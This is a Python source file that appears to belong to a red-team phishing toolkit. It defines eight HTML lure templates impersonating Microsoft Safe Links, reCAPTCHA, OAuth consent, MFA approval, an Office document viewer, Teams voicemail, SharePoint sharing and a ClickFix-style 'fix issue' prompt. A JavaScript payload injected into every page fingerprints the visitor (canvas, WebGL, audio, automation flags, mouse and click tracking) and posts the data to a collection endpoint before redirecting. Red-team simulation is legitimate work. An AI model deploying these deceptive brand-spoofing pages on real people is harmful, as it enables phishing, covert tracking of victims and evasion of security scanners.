"""Configurable lure template registry.

Each lure template is a function that returns HTML for the interstitial page.
Templates are designed to mimic real-world social engineering pretexts that
red teams commonly use. The JS fingerprinting payload is injected into every
template automatically.

Available templates:
    safelinks   - Microsoft Safe Links / ATP scanning page
    clickfix    - ClickFix-style "verify you are human" prompt
    captcha     - Google reCAPTCHA-style verification
    oauth       - OAuth consent / authorization page
    mfa         - MFA push notification verification
    docviewer   - Online document viewer loading page
    voicemail   - Voicemail notification player page
    sharepoint  - SharePoint file sharing notification
"""

from __future__ import annotations

from typing import Any

_JS_FINGERPRINT = r"""
<script>
(function() {
  "use strict";
  var t0 = Date.now();
  var m = {
    windowSize: [window.innerWidth, window.innerHeight],
    windowOuter: [window.outerWidth, window.outerHeight],
    screenSize: [screen.width, screen.height],
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio || 1,
    webdriver: (navigator.webdriver === true),
    mouseMoves: 0,
    clicks: 0,
    touchEvents: 0,
    hasTouchEvents: false,
    keyEvents: 0,
    scrollEvents: 0,
    focusEvents: 0,
    pluginCount: navigator.plugins ? navigator.plugins.length : -1,
    languageCount: navigator.languages ? navigator.languages.length : 0,
    languages: navigator.languages ? Array.from(navigator.languages) : [],
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || "unset",
    hardwareConcurrency: navigator.hardwareConcurrency || 0,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    platform: navigator.platform || "",
    vendor: navigator.vendor || "",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
    timezoneOffset: new Date().getTimezoneOffset(),
    canvasHash: null,
    canvasBlocked: false,
    webglRenderer: null,
    webglVendor: null,
    audioFingerprint: null,
    audioBlocked: false,
    automationAPIs: false,
    notificationPermission: typeof Notification !== "undefined" ? Notification.permission : "unsupported",
    connectionType: null,
    rafDelta: null,
    performanceTiming: null,
    touchSupport: ("ontouchstart" in window) || (navigator.maxTouchPoints > 0),
    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
    deviceMemory: navigator.deviceMemory || null,
    reducedMotion: window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches,
    darkMode: window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches,
    elapsed: 0,
    interactionTimeline: [],
    mousePattern: [],
    clickCoords: []
  };

  var iStart = Date.now();
  document.addEventListener("mousemove", function(e) {
    m.mouseMoves++;
    if (m.mousePattern.length < 50) {
      m.mousePattern.push([e.clientX, e.clientY, Date.now() - iStart]);
    }
  });
  document.addEventListener("click", function(e) {
    m.clicks++;
    if (m.clickCoords.length < 20) {
      m.clickCoords.push([e.clientX, e.clientY, Date.now() - iStart]);
    }
  });
  document.addEventListener("touchstart", function() {
    m.touchEvents++;
    m.hasTouchEvents = true;
  });
  document.addEventListener("keydown", function() { m.keyEvents++ });
  document.addEventListener("scroll", function() { m.scrollEvents++ });
  window.addEventListener("focus", function() { m.focusEvents++ });
  window.addEventListener("blur", function() {
    m.interactionTimeline.push(["blur", Date.now() - iStart]);
  });

  try {
    var c = document.createElement("canvas");
    c.width = 200; c.height = 50;
    var ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(50, 0, 100, 50);
    ctx.fillStyle = "#069";
    ctx.fillText("BPP:cv:fp", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("BPP:cv:fp", 4, 17);
    var d = c.toDataURL();
    if (d && d.length > 100) {
      var h = 0;
      for (var i = 0; i < d.length; i++) h = ((h << 5) - h + d.charCodeAt(i)) | 0;
      m.canvasHash = h.toString(16);
    } else m.canvasBlocked = true;
  } catch(e) { m.canvasBlocked = true }

  try {
    var gl = document.createElement("canvas").getContext("webgl")
         || document.createElement("canvas").getContext("experimental-webgl");
    if (gl) {
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        m.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        m.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      }
    }
  } catch(e) {}

  try {
    var actx = new (window.AudioContext || window.webkitAudioContext)();
    var osc = actx.createOscillator();
    var an = actx.createAnalyser();
    var gain = actx.createGain();
    var proc = actx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0;
    osc.type = "triangle";
    osc.connect(an); an.connect(proc); proc.connect(gain); gain.connect(actx.destination);
    osc.start(0);
    proc.onaudioprocess = function() {
      var buf = new Float32Array(an.frequencyBinCount);
      an.getFloatFrequencyData(buf);
      var sum = 0;
      for (var j = 0; j < buf.length; j++) sum += Math.abs(buf[j]);
      m.audioFingerprint = sum.toFixed(2);
      proc.disconnect(); osc.stop(); actx.close();
    };
    setTimeout(function() { try { proc.disconnect(); osc.stop(); actx.close() } catch(e){} }, 1500);
  } catch(e) { m.audioBlocked = true }

  try {
    if (window.__nightmare || window._phantom || window.callPhantom ||
        window.__selenium_unwrapped || window.__webdriver_evaluate ||
        window.__driver_evaluate || window.__webdriver_script_fn ||
        window.__webdriver_script_func || window.__lastWatirAlert ||
        window.__lastWatirConfirm || window.__lastWatirPrompt ||
        document.__selenium_unwrapped || document.__webdriver_evaluate ||
        window.domAutomation || window.domAutomationController ||
        navigator.webdriver) {
      m.automationAPIs = true;
    }
  } catch(e) {}

  try {
    if (navigator.connection)
      m.connectionType = navigator.connection.effectiveType || navigator.connection.type || null;
  } catch(e) {}

  try {
    var rafStart = performance.now();
    requestAnimationFrame(function() { m.rafDelta = Math.round(performance.now() - rafStart) });
  } catch(e) {}

  try {
    if (performance.timing) {
      var pt = performance.timing;
      m.performanceTiming = {
        domContentLoaded: pt.domContentLoadedEventEnd - pt.navigationStart,
        loadComplete: pt.loadEventEnd - pt.navigationStart,
        dns: pt.domainLookupEnd - pt.domainLookupStart,
        connect: pt.connectEnd - pt.connectStart,
        ttfb: pt.responseStart - pt.navigationStart
      };
    }
  } catch(e) {}

  window.__bpp_metrics = m;
  window.__bpp_send = function(cb) {
    m.elapsed = Date.now() - t0;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/_bpp/collect", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function() { if (cb) cb(true) };
    xhr.onerror = function() { if (cb) cb(false) };
    xhr.send(JSON.stringify(m));
  };
})();
</script>
"""


def _wrap_template(body_html: str, title: str, extra_head: str = "") -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{title}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  {extra_head}
</head>
<body>
{body_html}
{_JS_FINGERPRINT}
</body>
</html>"""


def lure_safelinks(params: dict[str, Any]) -> str:
    brand = params.get("brand", "Microsoft")
    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      background: #f3f3f3;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; color: #323130;
    }}
    .card {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.08);
      padding: 48px 36px; text-align: center;
      max-width: 440px; width: 92%;
    }}
    .logo {{ width: 108px; height: auto; margin-bottom: 24px }}
    h1 {{ font-size: 20px; font-weight: 600; margin-bottom: 8px }}
    p {{ font-size: 14px; color: #605e5c; line-height: 1.5 }}
    .ring {{
      margin: 28px auto 12px; width: 36px; height: 36px;
      border: 3px solid #edebe9; border-top-color: #0078d4;
      border-radius: 50%; animation: spin .9s linear infinite;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg) }} }}
    .foot {{ margin-top: 28px; font-size: 11px; color: #a19f9d }}
  </style>
  <div class="card">
    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
      <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
      <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
      <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
      <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
    </svg>
    <h1>Verifying your link&hellip;</h1>
    <p>This link is being scanned to ensure it is safe.<br>Please wait a moment.</p>
    <div class="ring"></div>
    <div class="foot">{brand} Safe Links&trade; Protection</div>
  </div>
  <script>
    setTimeout(function() {{
      window.__bpp_send(function() {{
        window.location.href = "/_bpp/gate";
      }});
    }}, 3500);
  </script>
""", f"{brand} Link Protection")


def lure_clickfix(params: dict[str, Any]) -> str:
    brand = params.get("brand", "")
    title = params.get("title", "Action Required")
    message = params.get("message", "Your system has detected an issue that requires verification.")
    button_text = params.get("button_text", "Fix Issue")

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #1a1a2e; color: #e0e0e0;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .container {{
      background: #16213e; border: 1px solid #0f3460;
      border-radius: 12px; padding: 40px; max-width: 480px; width: 92%;
      box-shadow: 0 8px 32px rgba(0,0,0,.3);
    }}
    .icon {{
      width: 56px; height: 56px; margin: 0 auto 20px;
      background: #e94560; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 28px;
    }}
    h1 {{ font-size: 22px; text-align: center; margin-bottom: 12px; color: #fff }}
    .msg {{ font-size: 14px; line-height: 1.6; text-align: center; margin-bottom: 24px; color: #a0a0b8 }}
    .steps {{
      background: #0f3460; border-radius: 8px; padding: 16px 20px;
      margin-bottom: 24px; font-size: 13px; line-height: 1.8;
    }}
    .steps li {{ margin-bottom: 4px }}
    .btn {{
      display: block; width: 100%; padding: 14px;
      background: #e94560; color: #fff; border: none;
      border-radius: 8px; font-size: 16px; font-weight: 600;
      cursor: pointer; transition: background .2s;
    }}
    .btn:hover {{ background: #c73650 }}
    .spinner {{ display: none; margin: 20px auto; width: 32px; height: 32px;
      border: 3px solid #333; border-top-color: #e94560;
      border-radius: 50%; animation: spin .8s linear infinite;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg) }} }}
    .foot {{ text-align: center; margin-top: 20px; font-size: 11px; color: #555 }}
  </style>
  <div class="container">
    <div class="icon">⚠️</div>
    <h1>{title}</h1>
    <p class="msg">{message}</p>
    <ol class="steps">
      <li>Click the button below to begin verification</li>
      <li>Follow the on-screen instructions</li>
      <li>Wait for the process to complete</li>
    </ol>
    <button class="btn" id="fixBtn">{button_text}</button>
    <div class="spinner" id="spinner"></div>
    <div class="foot">{brand}</div>
  </div>
  <script>
    document.getElementById("fixBtn").addEventListener("click", function() {{
      this.style.display = "none";
      document.getElementById("spinner").style.display = "block";
      window.__bpp_send(function() {{
        window.location.href = "/_bpp/gate";
      }});
    }});
  </script>
""", title)


def lure_captcha(params: dict[str, Any]) -> str:
    brand = params.get("brand", "")

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: Roboto, -apple-system, sans-serif;
      background: #f5f5f5;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .box {{
      background: #fff; border: 1px solid #d3d3d3; border-radius: 4px;
      padding: 20px 28px; width: 304px;
      box-shadow: 0 2px 6px rgba(0,0,0,.1);
    }}
    .row {{
      display: flex; align-items: center; gap: 14px;
      padding: 12px 0;
    }}
    .cb {{
      width: 28px; height: 28px; border: 2px solid #c1c1c1;
      border-radius: 3px; cursor: pointer; display: flex;
      align-items: center; justify-content: center;
      transition: all .2s; background: #fff;
    }}
    .cb.checked {{ background: #4285f4; border-color: #4285f4 }}
    .cb.checked::after {{ content: "\\2713"; color: #fff; font-size: 18px }}
    .label {{ font-size: 14px; color: #555; user-select: none; cursor: pointer }}
    .brand {{
      text-align: right; font-size: 11px; color: #999;
      border-top: 1px solid #eee; padding-top: 8px; margin-top: 4px;
    }}
    .brand img {{ height: 32px; display: block; margin-left: auto }}
    .spinner {{ display: none; width: 28px; height: 28px;
      border: 3px solid #ddd; border-top-color: #4285f4;
      border-radius: 50%; animation: spin .7s linear infinite;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg) }} }}
  </style>
  <div class="box">
    <div class="row">
      <div class="cb" id="cb"></div>
      <div class="spinner" id="sp"></div>
      <span class="label" id="lbl">I'm not a robot</span>
    </div>
    <div class="brand">
      <span style="color:#999;font-size:10px">reCAPTCHA</span><br>
      <span style="color:#bbb;font-size:9px">Privacy - Terms</span>
    </div>
  </div>
  <script>
    var cb = document.getElementById("cb");
    var sp = document.getElementById("sp");
    cb.addEventListener("click", function() {{
      cb.style.display = "none";
      sp.style.display = "block";
      document.getElementById("lbl").textContent = "Verifying...";
      setTimeout(function() {{
        window.__bpp_send(function() {{
          sp.style.display = "none";
          cb.style.display = "flex";
          cb.classList.add("checked");
          document.getElementById("lbl").textContent = "Verified";
          setTimeout(function() {{ window.location.href = "/_bpp/gate" }}, 800);
        }});
      }}, 1500);
    }});
  </script>
""", "Security Verification")


def lure_oauth(params: dict[str, Any]) -> str:
    brand = params.get("brand", "Microsoft")
    app_name = params.get("app_name", "Document Portal")
    permissions = params.get("permissions", [
        "Read your profile information",
        "Read your email address",
        "Access files shared with you",
    ])
    if isinstance(permissions, str):
        permissions = [p.strip() for p in permissions.split(",")]

    perm_html = "".join(f'<li>{p}</li>' for p in permissions)

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f2f2f2;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .card {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.1);
      padding: 40px 32px; max-width: 420px; width: 92%;
    }}
    .logo {{ text-align: center; margin-bottom: 20px }}
    .logo svg {{ width: 44px; height: auto }}
    h2 {{ font-size: 18px; text-align: center; margin-bottom: 6px }}
    .sub {{ font-size: 13px; color: #666; text-align: center; margin-bottom: 20px }}
    .app {{ font-weight: 600; color: #0078d4 }}
    .perms {{
      background: #fafafa; border: 1px solid #eee; border-radius: 6px;
      padding: 16px 20px; margin-bottom: 24px;
    }}
    .perms h3 {{ font-size: 13px; color: #333; margin-bottom: 10px }}
    .perms ul {{ padding-left: 18px; font-size: 13px; color: #555; line-height: 1.8 }}
    .btns {{ display: flex; gap: 12px }}
    .btn {{
      flex: 1; padding: 12px; border: none; border-radius: 6px;
      font-size: 14px; font-weight: 600; cursor: pointer;
    }}
    .btn-accept {{ background: #0078d4; color: #fff }}
    .btn-accept:hover {{ background: #106ebe }}
    .btn-deny {{ background: #f3f3f3; color: #333; border: 1px solid #ddd }}
    .btn-deny:hover {{ background: #e5e5e5 }}
    .foot {{ text-align: center; margin-top: 20px; font-size: 11px; color: #999 }}
  </style>
  <div class="card">
    <div class="logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
        <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
        <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
        <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
        <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
      </svg>
    </div>
    <h2>Permissions requested</h2>
    <p class="sub"><span class="app">{app_name}</span> wants to access your account</p>
    <div class="perms">
      <h3>This app would like to:</h3>
      <ul>{perm_html}</ul>
    </div>
    <div class="btns">
      <button class="btn btn-deny" onclick="window.__bpp_send(function(){{ window.location.href='/_bpp/gate' }})">Cancel</button>
      <button class="btn btn-accept" onclick="window.__bpp_send(function(){{ window.location.href='/_bpp/gate' }})">Accept</button>
    </div>
    <div class="foot">{brand} &middot; Terms of use &middot; Privacy</div>
  </div>
""", f"Sign in - {brand}")


def lure_mfa(params: dict[str, Any]) -> str:
    brand = params.get("brand", "Microsoft")

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f2f2f2;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .card {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.1);
      padding: 40px 32px; text-align: center;
      max-width: 380px; width: 92%;
    }}
    .icon {{ font-size: 48px; margin-bottom: 16px }}
    h1 {{ font-size: 20px; margin-bottom: 8px }}
    p {{ font-size: 14px; color: #605e5c; margin-bottom: 24px; line-height: 1.5 }}
    .code {{
      font-size: 36px; font-weight: 700; letter-spacing: 8px;
      color: #0078d4; margin-bottom: 24px;
      font-family: 'Consolas', 'Courier New', monospace;
    }}
    .btn {{
      display: block; width: 100%; padding: 12px;
      background: #0078d4; color: #fff; border: none;
      border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
    }}
    .btn:hover {{ background: #106ebe }}
    .deny {{ margin-top: 12px; background: none; border: 1px solid #ddd; color: #555 }}
    .deny:hover {{ background: #f5f5f5 }}
    .foot {{ margin-top: 24px; font-size: 11px; color: #999 }}
    .pulse {{ animation: pulse 2s ease-in-out infinite }}
    @keyframes pulse {{ 0%,100% {{ opacity:1 }} 50% {{ opacity:.5 }} }}
  </style>
  <div class="card">
    <div class="icon">\U0001f510</div>
    <h1>Approve sign-in request</h1>
    <p>A sign-in request has been sent to your account.<br>
    If this was you, approve the request below.</p>
    <div class="code pulse" id="codeDisplay">--</div>
    <button class="btn" onclick="window.__bpp_send(function(){{ window.location.href='/_bpp/gate' }})">Approve</button>
    <button class="btn deny" onclick="window.__bpp_send(function(){{ window.location.href='/_bpp/gate' }})">Deny</button>
    <div class="foot">{brand} Authenticator</div>
  </div>
  <script>
    var n = Math.floor(Math.random() * 90 + 10);
    document.getElementById("codeDisplay").textContent = n;
  </script>
""", f"{brand} - Verify your identity")


def lure_docviewer(params: dict[str, Any]) -> str:
    brand = params.get("brand", "Microsoft")
    doc_name = params.get("doc_name", "Q4_Financial_Report_2024.xlsx")
    sender = params.get("sender", "HR Department")

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f6f6f6;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .viewer {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 16px rgba(0,0,0,.1);
      max-width: 600px; width: 95%; overflow: hidden;
    }}
    .toolbar {{
      background: #217346; color: #fff; padding: 12px 20px;
      display: flex; align-items: center; gap: 12px;
    }}
    .toolbar svg {{ width: 24px; height: 24px; fill: #fff }}
    .toolbar .name {{ font-size: 14px; font-weight: 600 }}
    .info {{
      padding: 24px 20px; border-bottom: 1px solid #eee;
    }}
    .info .from {{ font-size: 13px; color: #666; margin-bottom: 4px }}
    .info .fname {{ font-size: 16px; font-weight: 600 }}
    .loading {{
      padding: 60px 20px; text-align: center;
    }}
    .bar-container {{
      width: 80%; margin: 20px auto; height: 4px;
      background: #e0e0e0; border-radius: 4px; overflow: hidden;
    }}
    .bar {{
      height: 100%; width: 0; background: #217346;
      animation: load 3s ease-in-out forwards;
    }}
    @keyframes load {{ to {{ width: 100% }} }}
    .loading p {{ font-size: 13px; color: #888; margin-top: 12px }}
    .foot {{ padding: 12px 20px; font-size: 11px; color: #999; text-align: center }}
  </style>
  <div class="viewer">
    <div class="toolbar">
      <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8" stroke="#217346" fill="none" stroke-width="1.5"/></svg>
      <span class="name">{brand} 365</span>
    </div>
    <div class="info">
      <div class="from">Shared by {sender}</div>
      <div class="fname">{doc_name}</div>
    </div>
    <div class="loading">
      <p>Loading document preview&hellip;</p>
      <div class="bar-container"><div class="bar"></div></div>
      <p>Verifying access permissions</p>
    </div>
    <div class="foot">{brand} &middot; OneDrive for Business</div>
  </div>
  <script>
    setTimeout(function() {{
      window.__bpp_send(function() {{
        window.location.href = "/_bpp/gate";
      }});
    }}, 3500);
  </script>
""", f"{doc_name} - {brand} 365")


def lure_voicemail(params: dict[str, Any]) -> str:
    brand = params.get("brand", "Microsoft")
    caller = params.get("caller", "+1 (555) 012-3456")
    duration = params.get("duration", "0:42")

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f2f2f2;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .card {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.1);
      padding: 32px; max-width: 420px; width: 92%;
    }}
    .header {{ display: flex; align-items: center; gap: 14px; margin-bottom: 20px }}
    .avatar {{
      width: 48px; height: 48px; background: #0078d4;
      border-radius: 50%; display: flex; align-items: center;
      justify-content: center; color: #fff; font-size: 22px;
    }}
    .meta h2 {{ font-size: 16px; margin-bottom: 2px }}
    .meta p {{ font-size: 13px; color: #888 }}
    .player {{
      background: #f9f9f9; border-radius: 8px; padding: 16px;
      margin-bottom: 20px;
    }}
    .waveform {{
      height: 40px; display: flex; align-items: center;
      gap: 2px; margin-bottom: 8px;
    }}
    .waveform span {{
      display: block; width: 3px; background: #0078d4;
      border-radius: 2px; animation: wave 1.5s ease-in-out infinite;
    }}
    @keyframes wave {{ 0%,100% {{ height: 10px }} 50% {{ height: 100% }} }}
    .time {{ font-size: 12px; color: #888; text-align: right }}
    .btn {{
      display: block; width: 100%; padding: 12px;
      background: #0078d4; color: #fff; border: none;
      border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
    }}
    .btn:hover {{ background: #106ebe }}
    .foot {{ text-align: center; margin-top: 16px; font-size: 11px; color: #999 }}
  </style>
  <div class="card">
    <div class="header">
      <div class="avatar">\U0001f3a4</div>
      <div class="meta">
        <h2>New Voicemail</h2>
        <p>{caller} &middot; {duration}</p>
      </div>
    </div>
    <div class="player">
      <div class="waveform" id="wf"></div>
      <div class="time">0:00 / {duration}</div>
    </div>
    <button class="btn" onclick="window.__bpp_send(function(){{ window.location.href='/_bpp/gate' }})">
      Play Message
    </button>
    <div class="foot">{brand} Teams &middot; Voicemail</div>
  </div>
  <script>
    var wf = document.getElementById("wf");
    for (var i = 0; i < 40; i++) {{
      var s = document.createElement("span");
      s.style.height = (Math.random() * 30 + 5) + "px";
      s.style.animationDelay = (Math.random() * 1.5) + "s";
      wf.appendChild(s);
    }}
  </script>
""", f"Voicemail - {brand} Teams")


def lure_sharepoint(params: dict[str, Any]) -> str:
    brand = params.get("brand", "Microsoft")
    file_name = params.get("file_name", "Project_Proposal_v3.docx")
    sender = params.get("sender", "Alex Johnson")
    org_name = params.get("org_name", "Contoso")

    return _wrap_template(f"""
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f6f6f6;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .card {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 16px rgba(0,0,0,.08);
      max-width: 480px; width: 92%; overflow: hidden;
    }}
    .top {{ background: #0078d4; padding: 20px 24px; color: #fff }}
    .top h1 {{ font-size: 18px; font-weight: 600 }}
    .body {{ padding: 24px }}
    .sender {{ display: flex; align-items: center; gap: 12px; margin-bottom: 20px }}
    .sender .av {{
      width: 40px; height: 40px; background: #8b5cf6;
      border-radius: 50%; display: flex; align-items: center;
      justify-content: center; color: #fff; font-weight: 600;
    }}
    .sender .info span {{ display: block }}
    .sender .name {{ font-weight: 600; font-size: 14px }}
    .sender .org {{ font-size: 12px; color: #888 }}
    .file {{
      display: flex; align-items: center; gap: 12px;
      background: #f9f9f9; border: 1px solid #eee;
      border-radius: 8px; padding: 16px; margin-bottom: 20px;
    }}
    .file-icon {{ font-size: 28px }}
    .file-name {{ font-size: 14px; font-weight: 600 }}
    .file-meta {{ font-size: 12px; color: #888 }}
    .btn {{
      display: block; width: 100%; padding: 14px;
      background: #0078d4; color: #fff; border: none;
      border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
    }}
    .btn:hover {{ background: #106ebe }}
    .foot {{ padding: 16px 24px; font-size: 11px; color: #999; text-align: center;
      border-top: 1px solid #eee }}
  </style>
  <div class="card">
    <div class="top">
      <h1>\U0001f4c4 {sender} shared a file with you</h1>
    </div>
    <div class="body">
      <div class="sender">
        <div class="av">{sender[0].upper()}</div>
        <div class="info">
          <span class="name">{sender}</span>
          <span class="org">{org_name}</span>
        </div>
      </div>
      <div class="file">
        <span class="file-icon">\U0001f4c4</span>
        <div>
          <div class="file-name">{file_name}</div>
          <div class="file-meta">SharePoint &middot; Shared just now</div>
        </div>
      </div>
      <button class="btn" onclick="window.__bpp_send(function(){{ window.location.href='/_bpp/gate' }})">
        Open File
      </button>
    </div>
    <div class="foot">{brand} SharePoint &middot; {org_name}</div>
  </div>
""", f"{file_name} - SharePoint")


LURE_REGISTRY: dict[str, Any] = {
    "safelinks": {
        "fn": lure_safelinks,
        "name": "Microsoft Safe Links",
        "description": "ATP Safe Links scanning interstitial",
    },
    "clickfix": {
        "fn": lure_clickfix,
        "name": "ClickFix",
        "description": "Fake system issue requiring user action",
    },
    "captcha": {
        "fn": lure_captcha,
        "name": "CAPTCHA Verification",
        "description": "Google reCAPTCHA-style checkbox",
    },
    "oauth": {
        "fn": lure_oauth,
        "name": "OAuth Consent",
        "description": "Application permission request page",
    },
    "mfa": {
        "fn": lure_mfa,
        "name": "MFA Verification",
        "description": "Multi-factor authentication push approval",
    },
    "docviewer": {
        "fn": lure_docviewer,
        "name": "Document Viewer",
        "description": "Online document preview loading page",
    },
    "voicemail": {
        "fn": lure_voicemail,
        "name": "Voicemail Notification",
        "description": "Teams/Outlook voicemail player page",
    },
    "sharepoint": {
        "fn": lure_sharepoint,
        "name": "SharePoint Sharing",
        "description": "File sharing notification from SharePoint",
    },
}


def render_lure(template_name: str, params: dict[str, Any] | None = None) -> str:
    entry = LURE_REGISTRY.get(template_name)
    if not entry:
        return lure_safelinks(params or {})
    return entry["fn"](params or {})


def list_templates() -> list[dict[str, str]]:
    return [
        {"id": k, "name": v["name"], "description": v["description"]}
        for k, v in LURE_REGISTRY.items()
    ]
